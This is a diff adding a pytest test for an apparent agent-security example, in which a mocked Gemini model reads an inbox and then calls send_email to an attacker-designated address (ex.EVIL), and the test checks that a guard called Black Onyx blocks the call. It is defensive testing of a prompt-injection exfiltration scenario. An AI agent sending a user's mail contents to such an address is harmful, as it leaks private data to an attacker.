@@ -51,3 +51,24 @@ def test_openai_backend_parses_tool_calls():
 
     out = ex.run_agent(ex.OpenAICompat(model="m", base_url="http://x/v1", client=_client(handler)), guarded=True, verbose=False)
     assert out["leaked"] == 0 and out["blocked"] == 0 and len(out["sent"]) == 1
+
+
+def test_gemini_backend_function_calls_and_blocking():
+    seen = []
+    turns = iter([
+        {"role": "model", "parts": [{"functionCall": {"name": "read_inbox", "args": {}}}]},
+        {"role": "model", "parts": [{"functionCall": {"name": "send_email",
+                                                      "args": {"to": ex.EVIL, "subject": "x", "body": "y"}}}]},
+        {"role": "model", "parts": [{"text": "done"}]},
+    ])
+
+    def handler(req: httpx.Request) -> httpx.Response:
+        seen.append(json.loads(req.content))
+        return httpx.Response(200, json={"candidates": [{"content": next(turns)}]})
+
+    out = ex.run_agent(ex.Gemini(client=_client(handler)), guarded=True, verbose=False)
+    assert out["leaked"] == 0 and out["blocked"] == 1
+    assert "parameters" not in seen[0]["tools"][0]["functionDeclarations"][0]            # empty schema omitted
+    assert seen[0]["tools"][0]["functionDeclarations"][1]["parameters"]["type"] == "OBJECT"
+    fr = seen[-1]["contents"][-1]["parts"][0]["functionResponse"]
+    assert fr["name"] == "send_email" and "blocked by Black Onyx" in fr["response"]["result"]
